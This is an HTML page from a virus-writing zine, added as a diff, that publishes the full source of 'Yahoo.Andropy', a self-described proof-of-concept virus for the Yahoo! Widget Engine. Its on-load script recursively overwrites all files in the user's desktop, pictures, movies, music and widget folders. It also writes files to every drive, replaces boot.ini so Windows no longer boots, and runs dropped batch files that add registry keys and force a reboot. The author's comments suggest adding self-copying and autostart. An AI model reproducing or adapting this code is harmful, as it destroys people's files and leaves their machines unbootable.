@@ -1,0 +1,377 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: SkyOut/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/SkyOut/Andropy"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;widget&gt;
+	&lt;version&gt;3.0.1&lt;/version&gt;
+	&lt;minimumVersion&gt;2.0&lt;/minimumVersion&gt;
+	//Author, Company and Copyright... does not seem to be used somewhere until now, 
+	//but is planned to be used in near future...
+	&lt;author&gt;[SkyOut]&lt;/author&gt;
+	&lt;company&gt;[Electrical Ordered Freedom]&lt;/company&gt;
+	&lt;copyright&gt;BSD License&lt;/copyright&gt;
+	//Turn the annoying debu window off
+	&lt;debug&gt;off&lt;/debug&gt;
+	//Always pop up in the center of the screen!
+	&lt;option&gt;dontRememberWindowPosition&lt;/option&gt;	
+
+&lt;!--
+	Yahoo.Andropy
+	Coded by: [SkyOut] [Electrical Ordered Freedom]
+	
+	First of all, when you read the whole code you might notice that I often used &quot; [SkyOut] .... &quot; this is
+	not because I love myself so much, I just wanted to show how to use that engine and its feature for several things.
+	The first time I heard of that engine was quite a long time ago, somewhere in winter 2005 I think... I hope that's not wrong...
+	It was in some computer magazine and it was meant to be something like &quot;coding for everyone&quot;... Yeah in some way I can say it's
+	true, coding for that engine is really like scripting, nothing difficult, but nevertheless or because of this MUCH fun =)
+	The idea to make this virus came to me when visiting some sites, where people talked about &quot;customizing XP&quot; and often they did it
+	by using interesting widgets, so guess what... I visited Yahoo! website and looked for stuff to read to start developing, well and
+	even this is simple, one beginners guide (~20 sites) and the reference (~300 sites). Oh and very important: The Widget Converter, this
+	is a tool to build the widgets (*.widget) out of a folder containing the ressources, the good thing is, you can use that converter to
+	get the folder with its ressources out of the widget file, too. So vice versa! The interesting thing maybe is, that the *.widget file is
+	nothing more then a *.zip file... Try making a *.zip file out of your ressources and rename *.zip to *.widget, double click and believe!
+	
+	Structure of such a *.widget folder is simple, but remember to do it like this:
+	
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	
+	[Folder: Name of your final *.widget file, decide yourself]
+	===========================================================
+	+++	      +++
+	+++ including +++
+	+++	      +++
+	[Folder: &quot; Contents &quot; Name it like this and nothing else!]
+	==========================================================
+	-&gt;*.kon file (THIS FILE MUST BE IN &quot; Contents &quot; FOLDER!)
+	
+	-&gt;other files... *.js, *.png, *.jpg... -&gt; could also be stored in several subfolders! From here decide
+	for yourself how many subfolders you want to have, how the structure should be!
+	
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	
+	
+	Hmm... enough background information from my side...
+	for more information visit the site of our friend Yahoo! =) -&gt; www.yahoo.com and widgets.yahoo.com for the widgets, even if you don't
+	want to develop them, take a look, very cool stuff! I like it!
+	
+	=========================================================
+	=========================================================
+	
+	Tested on: Windows XP SP 2 (Sorry, I don't have a MAC to test it =( ... would have been nice)
+	Finished: 21. August 2006
+	Site: www.eof-project.net
+	Greets to: rRlf (www.rrlf.de.vu), Doom Riderz (www.doomriderz.co.nr) and Cyber Underground Project (cup.su)
+	-&gt; more links on the site!
+	
+	Size (*.widget file on my Windows machine): ~95 KB
+	
+	Payload of Yahoo.Andropy:
+	
+	-&gt; Try to show example of appending to a file on ~/append.txt
+	-&gt; Try to show example of prepending to a file on ~/prepend.txt
+	-&gt; Overwrite all files in desktop, pictures, movies, music, wigdet... folders
+	-&gt; Copy a text file to the users home directory and every connected drive
+	-&gt; Open EOF site with users standard web browser =D
+	-&gt; Check if the running OS is Windows, if yes...
+		-&gt; Manipulate boot.ini file (must be on C drive), this will result in an error next time user tries to start PC
+		-&gt; Drop a batch script to access the Registry and write some information there
+		-&gt; Drop a batch script to shut down the system
+		
+	=========================================================
+	=========================================================
+	
+	Some final thoughts... Well until the end I was not sure how to handle the thing with copying itself somewhere... try yourself would be
+	the best maybe, if you do so, it could be interesting to make some autostart of the widget, copy somewhere, drop a batch file accessing the
+	registry and adding the needed entries! Remember the engine has to run so the *.widget file can be execute, but the nice thing about the
+	engine is, when you execute a widget file without the engine running, it will open the engine automatically, thanks Yahoo! So even
+	autostarting shouldn't be that hard =) Well what you have seen until now might be, that this engine provides some nice things but often you
+	have to use extra files, doing it over batch files or whatever to have real access to system... Enjoy!
+	
+	=========================================================
+	 This code is published under the BSD License. Have fun!
+	=========================================================
+--&gt;
+	
+	&lt;window&gt;
+		&lt;name&gt;Andropy&lt;/name&gt;
+		&lt;visible&gt;true&lt;/visible&gt;
+	&lt;/window&gt;
+	
+	&lt;image src=&quot;eof1.jpg&quot;&gt;
+		&lt;name&gt;EOF&lt;/name&gt;
+		//Always start with a full opacity
+		&lt;opacity&gt;100%&lt;/opacity&gt;
+		//This lets the image become brighter -&gt; mouse over effect =)
+		&lt;onMouseEnter&gt;
+			EOF.src = &quot;eof2.jpg&quot;;
+		&lt;/onMouseEnter&gt;
+		&lt;onMouseExit&gt;
+			EOF.src = &quot;eof1.jpg&quot;;
+		&lt;/onMouseExit&gt;
+	&lt;/image&gt;	
+	
+	//Execute this code when the widget starts!
+	&lt;action trigger=&quot;onLoad&quot;&gt;
+		&lt;![CDATA[
+		//This tag will let the XML parser ignore JavaScript signs like opening/closing brackets, else they would be 
+		//interpreted as brackets of XML tags, which would not make much sense for us...
+			
+			//Appending and prepending shown on two *.txt files, this is only an EXAMPLE... maybe in next version I
+			//will try to do some &quot;real&quot; appending/prepding to *.widget files, which would be more interesting of course, but
+			//lets see
+			
+			//Append some text to the file ~/append.txt (~ = Home Directory, see the basics of *nix based system)
+			exist = filesystem.itemExists(system.userDocumentsFolder + &quot;/&quot; + &quot;append.txt&quot;);
+			if(exist==true)
+			{
+				var data = filesystem.readFile(system.userDocumentsFolder + &quot;/&quot; + &quot;append.txt&quot;);
+				data = data + &quot;\n\n[SkyOut]\n[Electrical Ordered Freedom]&quot;;
+				filesystem.writeFile(system.userDocumentsFolder + &quot;/&quot; + &quot;append.txt&quot;, data);
+			}
+			else
+			{
+				alert(&quot;This is a PoC Virus for the Yahoo! Widget Engine, to see appending create a file with the name\n\
+\&quot; append.txt \&quot; in your home directory and fill it with some stuff...\n\
+then try again!&quot;);
+			}
+			
+			//Prepend some text to the file ~/append.txt (~ = Home Directory, see the basics of *nix based system)
+			exist = filesystem.itemExists(system.userDocumentsFolder + &quot;/&quot; + &quot;prepend.txt&quot;);
+			if(exist==true)
+			{
+				var data = &quot;[SkyOut]\n[Electrical Ordered Freedom]\n\n&quot;;
+				var data2 = filesystem.readFile(system.userDocumentsFolder + &quot;/&quot; + &quot;prepend.txt&quot;);
+				data = data + data2;
+				filesystem.writeFile(system.userDocumentsFolder + &quot;/&quot; + &quot;prepend.txt&quot;, data);
+			}
+			else
+			{
+				alert(&quot;This is a PoC Virus for the Yahoo! Widget Engine, to see prepending create a file with the name\n\
+\&quot; prepend.txt \&quot; in your home directory and fill it with some stuff...\n\
+then try again!&quot;);
+			}
+			
+			//Now all the overwriting functions will be called, the nice thing is: By setting &quot; true &quot; as
+			//the second paramter of &quot; filesystem.getDirectoryContents(path, true/false); &quot; will give
+			//you an array with all file names in &quot; path &quot; and RECURSIVE, thanks Yahoo! =)
+			
+			//Overwrite all files in the desktop folder
+			fileList = filesystem.getDirectoryContents(system.userDesktopFolder, true);
+			for(files in fileList)
+			{
+				var data = &quot;[SkyOut]\n[Electrical Ordered Freedom]\n\n&quot;;
+				filesystem.writeFile(system.userDesktopFolder + &quot;/&quot; + fileList[files], data);
+			}
+			
+			//Overwrite all files in the users pictures folder
+			fileList = filesystem.getDirectoryContents(system.userPicturesFolder, true);
+			for(files in fileList)
+			{
+				var data = &quot;[SkyOut]\n[Electrical Ordered Freedom]\n\n&quot;;
+				filesystem.writeFile(system.userPicturesFolder + &quot;/&quot; + fileList[files], data);
+			}
+			
+			//Overwrite all files in the users movies folder
+			fileList = filesystem.getDirectoryContents(system.userMoviesFolder, true);
+			for(files in fileList)
+			{
+				var data = &quot;[SkyOut]\n[Electrical Ordered Freedom]\n\n&quot;;
+				filesystem.writeFile(system.userMoviesFolder + &quot;/&quot; + fileList[files], data);
+			}
+			
+			//Overwrite all files in the users music folder
+			fileList = filesystem.getDirectoryContents(system.userMusicFolder, true);
+			for(files in fileList)
+			{
+				var data = &quot;[SkyOut]\n[Electrical Ordered Freedom]\n\n&quot;;
+				filesystem.writeFile(system.userMusicFolder + &quot;/&quot; + fileList[files], data);
+			}
+			
+			//Overwrite all files in the users widgets folder ... hehe =)
+			fileList = filesystem.getDirectoryContents(system.userWidgetsFolder, true);
+			for(files in fileList)
+			{
+				var data = &quot;[SkyOut]\n[Electrical Ordered Freedom]\n\n&quot;;
+				filesystem.writeFile(system.userWidgetsFolder + &quot;/&quot; + fileList[files], data);
+			}
+			
+			var data = &quot;========================================\n========================================\n\n\
+Hey hey Yahoo! Your engine is cool... really and this is a virus for it...\n\
+I began to like scripting for that engine, it was fun coding this PoC, i enjoyed...\n\
+and most I like that this will work on Mac OS X, too, that is a cool thing! =D\n\
+Best regards\n[SkyOut]\n[Electrical Ordered Freedom]\n\n\
+PS: Before I forget, couldn't you add some more features to access the system ;P\n\
+would be even more fun!&quot;;
+			
+			//Drop a text file containing the above	data into the users home directory...	
+			filesystem.writeFile(system.userDocumentsFolder + &quot;/&quot; + &quot;virus.txt&quot;, data);
+			
+			//...and all volumes on the computer, the nice thing is, this will try to copy to floppy disc
+			//as well (cd, dvd...), but if there is no floppy connected we WON'T get an error message, very good, very stealth =)
+			volumes = filesystem.volumes;
+			for(volume in volumes)
+			{
+				filesystem.writeFile(volumes[volume].path + &quot;/&quot; + &quot;virus.txt&quot;, data);
+			}
+			
+			//Open our site with the users standard web browser =D
+			openURL(&quot;http://www.eof-project.net/&quot;);
+			
+			//Test if we are running on Windows OS
+			if(system.platform==&quot;windows&quot;)
+			{
+				//Check if the file exists or not...
+				exist = filesystem.itemExists(&quot;C:\\boot.ini&quot;);
+				if(exist==true)
+				{
+					//Change the boot.ini file, next time user tries to start PC he will get an error message
+					var lines = &quot;[boot loader]\ntimeout=30\ndefault=multi(X)disk(X)rdisk(X)partition(X)\WINDOWS\n[operating systems]\n\
+multi(X)disk(X)rdisk(X)partition(X)\WINDOWS=\&quot;Microsoft Windows XP Home Edition\&quot; /fastdetect /NoExecute=OptIn&quot;;
+					filesystem.moveToTrash(&quot;C:\\boot.ini&quot;);
+					filesystem.writeFile(&quot;C:\\boot.ini&quot;, lines);	
+				}
+				
+				//The language itself does not support Registry access, so we will drop a *.bat file and execute it
+				var registry = &quot;@echo off\n\
+REG ADD HKLM\\System\\Infected\n\
+REG ADD HKLM\\System\\Infected /v Virus /t REG_EXPAND_SZ /d Andropy\n\
+REG ADD HKLM\\System\\Infected /v Author /t REG_EXPAND_SZ /d SkyOut\n\
+REG ADD HKLM\\System\\Infected /v Date /t REG_EXPAND_SZ /d 2006\n\
+REG ADD HKLM\\System\\Infected /v Site /t REG_EXPAND_SZ /d www.eof-project.net&quot;;
+					
+				filesystem.writeFile(system.userDocumentsFolder + &quot;/&quot; + &quot;registry.bat&quot;, registry);
+				filesystem.open(system.userDocumentsFolder + &quot;/&quot; + &quot;registry.bat&quot;);
+				
+				//Drop another *.bat file to reboot the system now!
+				var shutdown = &quot;@echo off\nSHUTDOWN -r&quot;;
+				filesystem.writeFile(system.userDocumentsFolder + &quot;/&quot; + &quot;shutdown.bat&quot;, shutdown);
+				filesystem.open(system.userDocumentsFolder + &quot;/&quot; + &quot;shutdown.bat&quot;);
+			}
+		]]&gt;
+	&lt;/action&gt;
+	
+	//The text the user will see when right clicking the image -&gt; Info! White text, red shadowed on black background...
+	&lt;about-box&gt;
+		&lt;image&gt;background.png&lt;/image&gt;	
+		
+		&lt;about-text&gt;
+			&lt;data&gt;Andropy&lt;/data&gt;
+			&lt;font&gt;Arial&lt;/font&gt;
+			&lt;size&gt;20&lt;/size&gt;
+			&lt;hOffset&gt;50&lt;/hOffset&gt;
+			&lt;vOffset&gt;50&lt;/vOffset&gt;
+			&lt;color&gt;#ffffff&lt;/color&gt;
+			&lt;shadow&gt;
+				&lt;color&gt;#ff0000&lt;/color&gt;
+				&lt;hOffset&gt;1&lt;/hOffset&gt;
+				&lt;vOffset&gt;1&lt;/vOffset&gt;
+			&lt;/shadow&gt;
+		&lt;/about-text&gt;	
+
+		&lt;about-text&gt;
+			&lt;data&gt;[SkyOut]&lt;/data&gt;
+			&lt;font&gt;Arial&lt;/font&gt;
+			&lt;size&gt;20&lt;/size&gt;
+			&lt;hOffset&gt;50&lt;/hOffset&gt;
+			&lt;vOffset&gt;70&lt;/vOffset&gt;
+			&lt;color&gt;#ffffff&lt;/color&gt;
+			&lt;shadow&gt;
+				&lt;color&gt;#ff0000&lt;/color&gt;
+				&lt;hOffset&gt;1&lt;/hOffset&gt;
+				&lt;vOffset&gt;1&lt;/vOffset&gt;
+			&lt;/shadow&gt;
+		&lt;/about-text&gt;	
+		
+		&lt;about-text&gt;
+			&lt;data&gt;[Electrical Ordered Freedom]&lt;/data&gt;
+			&lt;font&gt;Arial&lt;/font&gt;
+			&lt;size&gt;20&lt;/size&gt;
+			&lt;hOffset&gt;50&lt;/hOffset&gt;
+			&lt;vOffset&gt;90&lt;/vOffset&gt;
+			&lt;color&gt;#ffffff&lt;/color&gt;
+			&lt;shadow&gt;
+				&lt;color&gt;#ff0000&lt;/color&gt;
+				&lt;hOffset&gt;1&lt;/hOffset&gt;
+				&lt;vOffset&gt;1&lt;/vOffset&gt;
+			&lt;/shadow&gt;
+		&lt;/about-text&gt;	
+		
+		&lt;about-text&gt;
+			&lt;data&gt;Visit: www.eof-project.net&lt;/data&gt;
+			&lt;font&gt;Arial&lt;/font&gt;
+			&lt;size&gt;20&lt;/size&gt;
+			&lt;hOffset&gt;50&lt;/hOffset&gt;
+			&lt;vOffset&gt;130&lt;/vOffset&gt;
+			&lt;color&gt;#ffffff&lt;/color&gt;
+			&lt;shadow&gt;
+				&lt;color&gt;#ff0000&lt;/color&gt;
+				&lt;hOffset&gt;1&lt;/hOffset&gt;
+				&lt;vOffset&gt;1&lt;/vOffset&gt;
+			&lt;/shadow&gt;
+		&lt;/about-text&gt;
+		
+		&lt;about-text&gt;
+			&lt;data&gt;Best greets to YAHOO! =) I don't hate ya...&lt;/data&gt;
+			&lt;font&gt;Arial&lt;/font&gt;
+			&lt;size&gt;20&lt;/size&gt;
+			&lt;hOffset&gt;50&lt;/hOffset&gt;
+			&lt;vOffset&gt;170&lt;/vOffset&gt;
+			&lt;color&gt;#ffffff&lt;/color&gt;
+			&lt;shadow&gt;
+				&lt;color&gt;#ff0000&lt;/color&gt;
+				&lt;hOffset&gt;1&lt;/hOffset&gt;
+				&lt;vOffset&gt;1&lt;/vOffset&gt;
+			&lt;/shadow&gt;
+		&lt;/about-text&gt;
+		
+		&lt;about-text&gt;
+			&lt;data&gt;I just loved the coding! Go on proving an&lt;/data&gt;
+			&lt;font&gt;Arial&lt;/font&gt;
+			&lt;size&gt;20&lt;/size&gt;
+			&lt;hOffset&gt;50&lt;/hOffset&gt;
+			&lt;vOffset&gt;190&lt;/vOffset&gt;
+			&lt;color&gt;#ffffff&lt;/color&gt;
+			&lt;shadow&gt;
+				&lt;color&gt;#ff0000&lt;/color&gt;
+				&lt;hOffset&gt;1&lt;/hOffset&gt;
+				&lt;vOffset&gt;1&lt;/vOffset&gt;
+			&lt;/shadow&gt;
+		&lt;/about-text&gt;
+		
+		&lt;about-text&gt;
+			&lt;data&gt;alternative search engine and go on&lt;/data&gt;
+			&lt;font&gt;Arial&lt;/font&gt;
+			&lt;size&gt;20&lt;/size&gt;
+			&lt;hOffset&gt;50&lt;/hOffset&gt;
+			&lt;vOffset&gt;210&lt;/vOffset&gt;
+			&lt;color&gt;#ffffff&lt;/color&gt;
+			&lt;shadow&gt;
+				&lt;color&gt;#ff0000&lt;/color&gt;
+				&lt;hOffset&gt;1&lt;/hOffset&gt;
+				&lt;vOffset&gt;1&lt;/vOffset&gt;
+			&lt;/shadow&gt;
+		&lt;/about-text&gt;
+		
+		&lt;about-text&gt;
+			&lt;data&gt;developing this engine! ;)&lt;/data&gt;
+			&lt;font&gt;Arial&lt;/font&gt;
+			&lt;size&gt;20&lt;/size&gt;
+			&lt;hOffset&gt;50&lt;/hOffset&gt;
+			&lt;vOffset&gt;230&lt;/vOffset&gt;
+			&lt;color&gt;#ffffff&lt;/color&gt;
+			&lt;shadow&gt;
+				&lt;color&gt;#ff0000&lt;/color&gt;
+				&lt;hOffset&gt;1&lt;/hOffset&gt;
+				&lt;vOffset&gt;1&lt;/vOffset&gt;
+			&lt;/shadow&gt;
+		&lt;/about-text&gt;
+	&lt;/about-box&gt;	
+	
+//Finished!
+&lt;/widget&gt;
+</pre></body></html>
